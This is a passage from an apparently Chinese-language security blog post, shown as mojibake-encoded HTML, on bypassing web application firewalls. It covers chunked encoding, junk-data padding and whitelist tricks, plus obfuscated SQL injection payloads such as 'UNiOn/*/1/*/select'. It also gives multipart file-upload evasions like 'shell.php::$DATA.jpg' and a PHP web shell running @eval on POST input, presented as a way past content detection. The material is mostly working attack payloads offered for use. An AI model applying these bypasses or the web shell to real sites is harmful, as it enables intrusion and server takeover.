class="string">&#x27;xxxx&#x27;</span>]</span><br></pre></td></tr></table></figure><p>å¯ä»¥ä»<code>GET,POST,HEADER,METHOD</code>ç­‰åœ°æ–¹è·å–ç”¨æˆ·æäº¤çš„å‚æ•°ã€‚</p><p>å¦‚æœwafåªå¯¹<code>GETï¼ŒPOST</code>è¿›è¡Œæ£€æµ‹,æ²¡æœ‰ä¸åç«¯ç›¸é€‚åº”ï¼Œå°±å¯ä»¥ç»•è¿‡ã€‚</p><h4 id="HTTPåè®®"><a href="#HTTPåè®®" class="headerlink" title="HTTPåè®®"></a>HTTPåè®®</h4><h5 id="åˆ†å—ä¼ è¾“"><a href="#åˆ†å—ä¼ è¾“" class="headerlink" title="åˆ†å—ä¼ è¾“"></a>åˆ†å—ä¼ è¾“</h5><p>Burpæ’ä»¶ï¼š<a href="https://github.com/c0ny1/chunked-coding-converter">https://github.com/c0ny1/chunked-coding-converter</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Transfer-Encoding: chunked  <span class="comment"># è¡¨ç¤ºBODYçš„ä¼ è¾“ç¼–ç æ–¹å¼ä¸ºchunkedï¼ˆæ— Content-Lengthå­—æ®µï¼‰</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span> <span class="comment"># æŒ‡æ˜ä¼ è¾“çš„æ•°æ®é•¿åº¦</span></span><br><span class="line">a=<span class="number">1</span></span><br><span class="line"><span class="number">0</span> <span class="comment"># è¡¨ç¤ºä¼ è¾“ç»“æŸ</span></span><br></pre></td></tr></table></figure><p>PHPå®éªŒ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_REQUEST</span>[<span class="string">&#x27;id&#x27;</span>] å¤±è´¥</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>] æˆåŠŸ</span><br></pre></td></tr></table></figure><h5 id="keep-alive"><a href="#keep-alive" class="headerlink" title="keep-alive"></a>keep-alive</h5><p>httpé•¿è¿æ¥ï¼Œå‘é€å¤šä¸ªæ•°æ®åŒ…è¯·æ±‚ï¼Œæ„Ÿè§‰è·Ÿè¯·æ±‚èµ°ç§å¾ˆåƒ</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Keep-Alive</span><br></pre></td></tr></table></figure><p>éœ€è¦å…³é—­</p><p><img src="/../images/image-20230517113339255.png" alt="image-20230517113339255"></p><h5 id="multipart-x2F-form-data"><a href="#multipart-x2F-form-data" class="headerlink" title="multipart&#x2F;form-data"></a>multipart&#x2F;form-data</h5><p><strong>æ¨èé˜…è¯»</strong></p><p><a href="http://www.moonslow.com/article/tencent_waf_bypass">http://www.moonslow.com/article/tencent_waf_bypass</a></p><blockquote><p><strong>æƒ³åŠæ³•è®©WAFä»¥ä¸ºæˆ‘ä»¬æ˜¯åœ¨ä¸Šä¼ æ–‡ä»¶ï¼Œè€Œå®é™…ä¸Šå´æ˜¯åœ¨POSTä¸€ä¸ªå‚æ•°ï¼Œè¿™ä¸ªå‚æ•°å¯ä»¥æ˜¯å‘½ä»¤æ³¨å…¥ã€SQLæ³¨å…¥ã€SSRFç­‰ä»»æ„çš„ä¸€ç§æ”»å‡»ï¼Œè¿™æ ·å°±å®ç°äº†é€šç”¨WAF Bypass</strong></p><p>ä½•æ—¶æ˜¯ä¸Šä¼ æ–‡ä»¶ï¼Ÿä½•æ—¶æ˜¯POSTå‚æ•°å‘¢ï¼Ÿè¿™ä¸ªå…³é”®ç‚¹åœ¨äºæœ‰æ²¡æœ‰ä¸€ä¸ªå®Œæ•´çš„ï¼Œè¿ç»­çš„**filename&#x3D;**ï¼Œä¸­é—´å¯ä»¥æ’å…¥<code>\r\n</code>æˆ–è€…<code>\n</code></p></blockquote><p><img src="/../images/image-20230518163001348.png" alt="image-20230518163001348"></p><h4 id="wafç‰¹æ€§"><a href="#wafç‰¹æ€§" class="headerlink" title="wafç‰¹æ€§"></a>wafç‰¹æ€§</h4><blockquote><p>éƒ¨ç½²æ–¹å¼ï¼Œç­–ç•¥ä¸è§„åˆ™ç¼ºé™·</p></blockquote><h5 id="äº‘waf"><a href="#äº‘waf" class="headerlink" title="äº‘waf"></a>äº‘waf</h5><p><img src="/../images/zh-cn_image_0000001193876233.png" alt="img"></p><p>â€‹é€šè¿‡æ”¹å˜ç”¨æˆ·åŸŸåçš„DNSè§£æåœ°å€æ¥å°†Webæµé‡ç‰µå¼•åˆ°äº‘WAFå¼•æ“é›†ç¾¤ï¼Œç»è¿‡æ£€æµ‹åå†å›æºè‡³çœŸæ­£çš„WebæœåŠ¡å™¨ã€‚</p><p><img src="/../images/zh-cn_image_0000001159784637.png" alt="img"></p><p>â€‹æ‰€ä»¥å¦‚æœå¯ä»¥æ‰¾åˆ°ç›®æ ‡çš„çœŸå®ipï¼Œå°±å¯ä»¥ç»•è¿‡äº‘wafã€‚</p><h5 id="æ€§èƒ½ç¼ºé™·"><a href="#æ€§èƒ½ç¼ºé™·" class="headerlink" title="æ€§èƒ½ç¼ºé™·"></a>æ€§èƒ½ç¼ºé™·</h5><h6 id="é«˜å¹¶å‘"><a href="#é«˜å¹¶å‘" class="headerlink" title="é«˜å¹¶å‘"></a>é«˜å¹¶å‘</h6><p>ç”¨Burpçš„<code>Trubo Intruder</code>æ’ä»¶,å¤±è´¥</p><p>è€Œä¸”é«˜å¹¶å‘å¾ˆå¯èƒ½ä¼šé€ æˆä¸šåŠ¡ç³»ç»Ÿå‡ºç°é—®é¢˜ã€‚</p><h6 id="è„æ•°æ®"><a href="#è„æ•°æ®" class="headerlink" title="è„æ•°æ®"></a>è„æ•°æ®</h6><p>ä¸ºäº†é˜²æ­¢æ¶ˆè€—å¤ªå¤šçš„CPUã€å†…å­˜èµ„æºï¼Œå› æ­¤è®¸å¤šWAFåªæ£€æµ‹å‰é¢çš„2Mæˆ–4Mçš„å†…å®¹ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡å¡«å……åƒåœ¾æ•°æ®è¿›è¡Œç»•è¿‡ã€‚</p><h6 id="å®éªŒ"><a href="#å®éªŒ" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h6><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516150951130.png" alt="image-20230516150951130"></p><p>å®‰å…¨ğŸ•åœ¨<code>HTTP BODY</code>ä¸­æ£€æµ‹åˆ°äº†å…³é”®å­—ï¼Œç›´æ¥è¿”å›500ã€‚ã€‚</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">a<span class="operator">=</span><span class="number">8172</span><span class="operator">*</span>A<span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516151625299.png" alt="image-20230516151625299"></p><h6 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h6><p><code>waf</code>å¯èƒ½ç›´æ¥æ£€æµ‹é•¿åº¦æ¥æ‹¦æˆª</p><p>å¦‚å®‰å…¨ğŸ•,<code>GET</code>ä¸‹æ˜¯ä¸è¡Œçš„</p><p><img src="/../images/image-20230516151807403.png" alt="image-20230516151807403"></p><h5 id="ç™½åå•æœºåˆ¶"><a href="#ç™½åå•æœºåˆ¶" class="headerlink" title="ç™½åå•æœºåˆ¶"></a>ç™½åå•æœºåˆ¶</h5><ul><li><p>æ–‡ä»¶ç™½åå•</p><blockquote><p>ä¸€äº› WAF ä¸ºäº†ä¿è¯æ ¸å¿ƒåŠŸèƒ½å¦‚ç™»é™†åŠŸèƒ½æ­£å¸¸ï¼Œä¼šåœ¨å†…éƒ¨è®¾ç«‹ä¸€ä¸ªæ–‡ä»¶ç™½åå•ï¼Œæˆ–å†…å®¹ç™½åå•ï¼Œåªè¦å’Œè¿™äº›æ–‡ä»¶æˆ–å†…å®¹æœ‰å…³ï¼Œæ— è®ºæ€ä¹ˆæµ‹è¯•ï¼Œéƒ½ä¸ä¼šè¿›è¡Œæ‹¦æˆªã€‚</p><p>å¦‚ï¼šWAF è®¾ç«‹äº†ç™½åå•<code>/admin</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„æµ‹è¯• payload å¯ä»¥é€šè¿‡å¦‚ä¸‹çš„æ‰‹æ³•æ¥ç»•è¿‡</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åŸæ¥è¢«æ‹¦æˆª</span></span><br><span class="line">http:<span class="comment">//a.a/?id=123 and 2*3=6</span></span><br><span class="line"><span class="comment"># ç°åœ¨ä¸æ‹¦æˆª</span></span><br><span class="line">http:<span class="comment">//a.a/?a=/admin&amp;id=123 and 2*3=6</span></span><br></pre></td></tr></table></figure></li><li><p>IPç™½åå•</p><blockquote><p>åç«¯é€šè¿‡Headerå­—æ®µè·å–æºIP</p></blockquote><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">X-FORWARDED-FORç­‰</span><br></pre></td></tr></table></figure></li><li><p>UAç™½åå•</p><blockquote><p>æŸäº›WAFå¯èƒ½ä¸ºäº†ä¸å½±å“ç«™ç‚¹çš„SEOä¼˜åŒ–ï¼Œå°†User-Agentä¸ºæŸäº›æœç´¢å¼•æ“ï¼ˆå¦‚è°·æ­Œï¼‰çš„è¯·æ±‚å½“ä½œç™½åå•å¤„ç†ï¼Œä¸æ£€æµ‹å’Œæ‹¦æˆªã€‚</p></blockquote><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">User-Agent</span><br></pre></td></tr></table></figure><p>UAæ”¶é›†ï¼š<a href="https://www.0735.pro/archives/study/51.html">https://www.0735.pro/archives/study/51.html</a></p></li></ul><h5 id="é™æ€æ–‡ä»¶ç»•è¿‡"><a href="#é™æ€æ–‡ä»¶ç»•è¿‡" class="headerlink" title="é™æ€æ–‡ä»¶ç»•è¿‡"></a>é™æ€æ–‡ä»¶ç»•è¿‡</h5><p>ä¸€äº› WAF ä¸ºäº†å‡å°‘æœåŠ¡å™¨çš„å‹åŠ›ï¼Œä¼šå¯¹é™æ€æ–‡ä»¶å¦‚<code>.png</code>ã€<code>.css</code>ç­‰ç›´æ¥æ”¾è¡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•ä¼ªè£…æˆé™æ€æ–‡ä»¶æ¥ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åŸæ¥è¢«æ‹¦æˆª</span></span><br><span class="line">http:<span class="comment">//a.a/?id=123 and 2*3=6</span></span><br><span class="line"><span class="comment"># ç°åœ¨ä¸æ‹¦æˆª</span></span><br><span class="line">http:<span class="comment">//a.a/?1.jpg&amp;id=123 and 2*3=6</span></span><br></pre></td></tr></table></figure><h5 id="è¯·æ±‚æ–¹å¼"><a href="#è¯·æ±‚æ–¹å¼" class="headerlink" title="è¯·æ±‚æ–¹å¼"></a>è¯·æ±‚æ–¹å¼</h5><ol><li>ä¸€äº› WAF å¯¹äº<code>get</code>è¯·æ±‚å’Œ<code>post</code>è¯·æ±‚çš„å¤„ç†æœºåˆ¶ä¸ä¸€æ ·ï¼Œå¯èƒ½å¯¹ POST è¯·æ±‚ç¨åŠ æ¾æ‡ˆï¼Œå› æ­¤ç»™<code>GET</code>è¯·æ±‚å˜æˆ<code>POST</code>è¯·æ±‚æœ‰å¯èƒ½ç»•è¿‡æ‹¦æˆªã€‚</li><li>ä¸€äº› WAF æ£€æµ‹åˆ°<code>POST</code>è¯·æ±‚åï¼Œå°±ä¸ä¼šå¯¹<code>GET</code>æºå¸¦çš„å‚æ•°è¿›è¡Œè¿‡æ»¤æ£€æµ‹ï¼Œå› æ­¤å¯¼è‡´è¢«ç»•è¿‡ã€‚</li></ol><h5 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h5><blockquote><p>fuzzå¤§æ³•ï¼Œä½¿ç”¨è„šæœ¬å»æ¢æµ‹WAFè®¾å¤‡å¯¹äºå­—ç¬¦å¤„ç†æ˜¯å¦æœ‰å¼‚å¸¸ï¼Œä¸€äº›WAFå¯èƒ½ç”±äºè‡ªèº«çš„è§£æé—®é¢˜ï¼Œå¯¹äºæŸäº›å­—ç¬¦è§£æå‡ºé”™ï¼Œé€ æˆå…¨å±€çš„bypass</p></blockquote><p>æµ‹è¯•ç‚¹</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">1ï¼‰ï¼šgetè¯·æ±‚å¤„ </span><br><span class="line">2ï¼‰ï¼šheaderè¯·æ±‚å¤„ </span><br><span class="line">3ï¼‰ï¼špost urlencodeå†…å®¹å¤„ </span><br><span class="line">4ï¼‰ï¼špost form-dataå†…å®¹å¤„</span><br></pre></td></tr></table></figure><p>åŸºç¡€å†…å®¹</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">1ï¼‰ç¼–ç è¿‡çš„0-255å­—ç¬¦ </span><br><span class="line">2ï¼‰è¿›è¡Œç¼–ç çš„0-255å­—ç¬¦ </span><br><span class="line">3ï¼‰utf gbkå­—ç¬¦</span><br></pre></td></tr></table></figure><h3 id="æ­£é¢ç¡¬åˆš"><a href="#æ­£é¢ç¡¬åˆš" class="headerlink" title="æ­£é¢ç¡¬åˆš"></a>æ­£é¢ç¡¬åˆš</h3><blockquote><p>å¢å¢æ”¹æ”¹æ··æ·†è§†å¬ï¼Œä½¿wafçš„è§„åˆ™å’Œç­–ç•¥å¤±æ•ˆ</p><p><strong>åŸºæœ¬æ–¹é’ˆ</strong>ï¼š</p><ol><li>å¢åˆ æµ‹è¯•wafå®¹å¿åº¦ï¼Œç¡®è®¤å…³é”®ç‚¹</li><li>æœ¬åœ°FUZZ PAYLOAD,å…ˆä¿è¯å¯ä»¥ç»•è¿‡æ£€æµ‹</li><li>å†æ¬¡è¿›è¡Œæ„é€ ä½¿å¾—åç«¯èƒ½å¤Ÿè¿›è¡Œè§£æ</li></ol></blockquote><h4 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h4><p>ç®€å•fuzz</p><p><img src="/../images/image-20230517001306283.png" alt="image-20230517001306283"></p><p>å¯ä»¥å‘ç°ä¸ä¼šå¯¹å•ä¸€çš„å…³é”®å­—è¿›è¡Œè¿‡æ»¤ï¼Œä¼šå¯¹ä¸€äº›ç»„åˆè¿›è¡Œè¿‡æ»¤</p><h5 id="union-selectç»•è¿‡"><a href="#union-selectç»•è¿‡" class="headerlink" title="union selectç»•è¿‡"></a><code>union select</code>ç»•è¿‡</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union (select)</span><br><span class="line">UNiOn/*/1/*/select</span><br><span class="line">UNiOn--+%02%0d%0aselect    #æ³¨é‡Šæ¢è¡Œ</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">UNiOn</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516154023102.png" alt="image-20230516154023102"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">UNiOn</span><span class="comment">/*/1/*/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516154137250.png" alt="image-20230516154137250"></p><p>åœ¨<code>/**/</code>ä¸­æ’å…¥<code>/x/</code>å³å¯ï¼Œxè‡³å°‘ä¸ºä¸€ä¸ªå­—ç¬¦</p><h5 id="å‡½æ•°ç»•è¿‡"><a href="#å‡½æ•°ç»•è¿‡" class="headerlink" title="å‡½æ•°ç»•è¿‡"></a>å‡½æ•°ç»•è¿‡</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span><span class="comment">/*/1/*/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database()<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516221518813.png" alt="image-20230516221518813"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span><span class="comment">/*/1/*/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database<span class="comment">/**/</span>()<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516221551123.png" alt="image-20230516221551123"></p><p>FUZZç»“æœ</p><p><img src="/../images/image-20230517000942363.png" alt="image-20230517000942363"></p><p><img src="/../images/image-20230517000931846.png" alt="image-20230517000931846"></p><h5 id="select-from"><a href="#select-from" class="headerlink" title="select from"></a><code>select from</code></h5><p>ç¡¬åˆšG</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åˆ†å—ä¼ è¾“ï¼Œè„æ•°æ®ç­‰æˆåŠŸ</span><br></pre></td></tr></table></figure><h4 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h4><h5 id="wafæ£€æµ‹å†…å®¹"><a href="#wafæ£€æµ‹å†…å®¹" class="headerlink" title="wafæ£€æµ‹å†…å®¹"></a>wafæ£€æµ‹å†…å®¹</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯·æ±‚çš„url</span><br><span class="line">Boundaryè¾¹ç•Œ</span><br><span class="line">MIMEç±»å‹</span><br><span class="line">æ–‡ä»¶åç¼€å</span><br><span class="line">æ–‡ä»¶å¤´</span><br><span class="line">æ–‡ä»¶å†…å®¹</span><br><span class="line">è®¿é—®æµé‡</span><br></pre></td></tr></table></figure><h5 id="æ–‡ä»¶ä¸Šä¼ æ•°æ®åŒ…"><a href="#æ–‡ä»¶ä¸Šä¼ æ•°æ®åŒ…" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ•°æ®åŒ…"></a>æ–‡ä»¶ä¸Šä¼ æ•°æ®åŒ…</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">    </span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">submit</span><br><span class="line">------WebKitFormBoundary9zWBDx6vAJHGTpAl--</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl å®šä¹‰äº†BODYä¸­çš„åˆ†ç•Œçº¿(å› ä¸ºæ˜¯è°·æ­Œæµè§ˆå™¨ï¼Œæ‰€ä»¥åˆ†ç•Œçº¿ä¸º----WebKitFormBoundaryåŠ ä¸Šéšæœºå­—ç¬¦ä¸²)</span><br><span class="line"></span><br><span class="line">--boundary</span><br><span class="line"></span><br><span class="line">--boundary   <span class="comment"># æ¯ä¸¤ä¸ªåˆ†ç•Œçº¿ä¹‹é—´æ˜¯å…·ä½“çš„å†…å®¹ï¼šæ–‡ä»¶ä¸Šä¼ ï¼Œpostå‚æ•°</span></span><br><span class="line"></span><br><span class="line">--boundary--  <span class="comment"># ç»“æŸæ ‡å¿—</span></span><br></pre></td></tr></table></figure><h5 id="å®‰å…¨ğŸ•æµ‹è¯•"><a href="#å®‰å…¨ğŸ•æµ‹è¯•" class="headerlink" title="å®‰å…¨ğŸ•æµ‹è¯•"></a>å®‰å…¨ğŸ•æµ‹è¯•</h5><ul><li><p>ä¸å…è®¸phpåç¼€ä¸Šä¼ </p></li><li><p>ä¸Šä¼ æ—¶ï¼Œä¸æ£€æŸ¥æ–‡ä»¶å†…å®¹</p></li><li><p>è®¿é—®æ—¶ï¼Œä¸å…è®¸è®¿é—®å«æœ‰æ¶æ„å†…å®¹çš„phpæ–‡ä»¶</p></li></ul><h6 id="ç»•è¿‡åç¼€"><a href="#ç»•è¿‡åç¼€" class="headerlink" title="ç»•è¿‡åç¼€"></a>ç»•è¿‡åç¼€</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=a</span><br><span class="line"></span><br><span class="line">å¢åŠ å¤šä¸ªboundary</span><br><span class="line">phpï¼šå¯ä»¥åœ¨boundaryå‰åæ·»åŠ ä»»æ„å­—ç¬¦</span><br><span class="line">å¤§å°å†™</span><br><span class="line">boundary=boundary=a</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line"></span><br><span class="line">æ“ä½œï¼š</span><br><span class="line">å¤§å°å†™</span><br><span class="line">Content-Disposition ä»»æ„ä½ç½®æ¢è¡Œ,ç©ºæ ¼ï¼Œè„æ•°æ®æº¢å‡ºï¼Œå¤šä¸ªContent-Dispositionï¼Œform-dataï¼ˆåˆ é™¤ï¼Œæ”¹ä¸º*ï¼‰</span><br><span class="line">å¤šä¸ªfilenameï¼Œå¤šä¸ª;</span><br><span class="line">æ–‡ä»¶åå•åŒå¼•å·æ•°é‡</span><br><span class="line">content-typeï¼ˆå¢åˆ ï¼Œè®¾ç½®charsetï¼‰</span><br><span class="line">å¤šä¸ªBODY</span><br><span class="line">å¤šä¸ªboundary</span><br><span class="line">äº¤æ¢nameå’Œfilenameçš„é¡ºåº</span><br><span class="line">æ’åˆ—ç»„åˆ</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: </span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Accept-Encoding: compress</span><br><span class="line">Accept-Encoding: deflate</span><br><span class="line">Accept-Encoding: br</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Accept-Encoding: *</span><br></pre></td></tr></table></figure><p>Windows</p><ul><li>NTFS æµ</li></ul><p>  <a href="https://learn.microsoft.com/zh-cn/windows/win32/fileio/file-streams">æ–‡ä»¶æµ (æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ) - Win32 apps | Microsoft Learn</a></p><p>  fuzzå¯ä»¥çš„</p>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">::$DATA</span><br><span class="line">::$INDEX_ALLOCATION</span><br></pre></td></tr></table></figure><p>  <img src="/../images/20171227163716-2507a226-eae1-1.png" alt="20171227163716-2507a226-eae1-1"></p><p>  <img src="/../images/image-20230517195752567.png" alt="image-20230517195752567"></p><ul><li><p>æ–‡ä»¶å</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">æ–‡ä»¶åå°¾åŠ ä»»æ„ä¸ª. æˆ–è€…ä»»æ„ä¸ªç©ºæ ¼ï¼ˆå¯¹æ–‡ä»¶åæ— å½±å“ï¼‰</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">windowsæ–‡ä»¶åçš„ä¿ç•™å­—ç¬¦ï¼ˆä¸å…è®¸å‡ºç°ï¼‰</span><br><span class="line">\/:*?<span class="string">&quot; &lt;&gt;|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å½“filename=shell.php:.jpg</span></span><br><span class="line"><span class="string">ç»“æœï¼š</span></span><br><span class="line"><span class="string">å¯ä»¥ä¸Šä¼ shell.phpï¼Œä½†æ˜¯ä¼šåƒæ‰æ–‡ä»¶å†…å®¹ã€‚ã€‚ã€‚</span></span><br><span class="line"><span class="string">å…¶ä»–çš„è¦ä¸ä¸å¯ä»¥ï¼Œå¯ä»¥çš„è¯ï¼Œä¸Šä¼ çš„æ–‡ä»¶åä¸º.jpg</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20230517155239619.png" alt="image-20230517155239619"></p><ul><li><p>æ–‡ä»¶åé•¿åº¦</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">æˆªæ–­è¶…é•¿æ–‡ä»¶åwindowsæ–‡ä»¶åï¼šé•¿åº¦é™åˆ¶å®Œå…¨é™å®šæ–‡ä»¶åå¿…é¡»å°‘äº<span class="number">260</span>ä¸ªå­—ç¬¦ï¼Œç›®å½•åå¿…é¡»å°äº<span class="number">248</span>ä¸ªå­—ç¬¦linuxæ–‡ä»¶åï¼šlinuxä¸­æ–‡ä»¶åæœ€é•¿ä¸º<span class="number">255</span>å­—ç¬¦ï¼Œæ–‡ä»¶è·¯å¾„æœ€å¤§é•¿åº¦ä¸º<span class="number">4096</span>å­—ç¬¦å¦‚æœåç«¯è„šæœ¬æ²¡æœ‰é™åˆ¶ä¸Šä¼ æ–‡ä»¶åé•¿åº¦ï¼Œå¯ä»¥é€šè¿‡å¤šæ¬¡æµ‹è¯•ï¼Œä¸Šä¼ åä¸ºaaaaaâ€¦(<span class="number">200</span>+).php.jpgï¼ŒæŠŠæœ€åçš„.jpgæŒ¤å‡ºå»ï¼Œ</span><br></pre></td></tr></table></figure></li></ul><p><strong>éƒ¨åˆ†æˆåŠŸçš„ï¼Œå¥½ç»•</strong></p><p>wafæ˜¯è§£ææœ€åä¸€ä¸ªå‚æ•°ï¼Œæœ€åä¸€ä¸ª;åé¢çš„ï¼Œä½†æ˜¯å¦‚æœæœ€åä¸€ä¸ªï¼›åé¢æ²¡æœ‰å‚æ•°ï¼Œ</p><p>åç«¯å°±å–å‰ä¸€ä¸ª,wafè¯†åˆ«åˆ°ç©º</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=shell.php;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517144614924.png" alt="image-20230517144614924"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=<span class="string">&#x27;shell.php&#x27;</span>; <span class="comment"># åŒå¼•å·ä¸è¡Œ</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517144541805.png" alt="image-20230517144541805"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>;filename=shell.php</span><br><span class="line"></span><br><span class="line">é™¤äº†shell.phpå¤„ï¼Œå…¶ä»–åœ°æ–¹åŠ æ¢è¡Œï¼Œæˆ–è„æ•°æ®éƒ½å¯</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517145839048.png" alt="image-20230517145839048"></p><p>åˆ é™¤<code>content-type</code></p><p><img src="/../images/image-20230517153416749.png" alt="image-20230517153416749"></p><p>å¢åŠ <code>boundary</code></p><p><img src="/../images/image-20230517175433650.png" alt="image-20230517175433650"></p><p>å®‰å…¨ğŸ•+ä»£ç ç™½åå•ï¼ˆåç¼€åªå…è®¸å›¾ç‰‡ï¼‰</p><p>ä¸Šé¢ä»»æ„ä¸€ä¸ªç»•è¿‡ï¼ˆé™¤äº†ï¼›ç»•è¿‡ï¼‰+</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=shell.php::$DATA.jpg</span><br></pre></td></tr></table></figure><h6 id="ç»•è¿‡æ–‡ä»¶å†…å®¹æ£€æµ‹â€“å…æ€"><a href="#ç»•è¿‡æ–‡ä»¶å†…å®¹æ£€æµ‹â€“å…æ€" class="headerlink" title="ç»•è¿‡æ–‡ä»¶å†…å®¹æ£€æµ‹â€“å…æ€"></a>ç»•è¿‡æ–‡ä»¶å†…å®¹æ£€æµ‹â€“å…æ€</h6><p>å®‰å…¨ğŸ•çš„å†…å®¹æ£€æµ‹éšä¾¿æ”¹ä¸€ä¸‹å°±è¿‡äº†ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="comment">// $cmd = base64_decode($_POST[1]);</span></span><br><span class="line"><span class="variable">$foo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h6 id="ç»•è¿‡æµé‡"><a href="#ç»•è¿‡æµé‡" class="headerlink" 